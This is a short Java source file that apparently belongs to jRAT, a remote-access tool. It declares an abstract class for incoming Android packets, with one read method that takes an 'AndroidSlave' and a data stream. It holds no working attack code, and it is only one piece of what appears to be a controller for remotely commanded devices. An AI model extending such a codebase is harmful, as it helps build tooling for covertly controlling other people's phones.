package se.jrat.controller.packets.android.incoming;

import java.io.DataInputStream;

import se.jrat.controller.android.AndroidSlave;


public abstract class AbstractIncomingAndroidPacket {

	public abstract void read(AndroidSlave slave, DataInputStream dis) throws Exception;

}
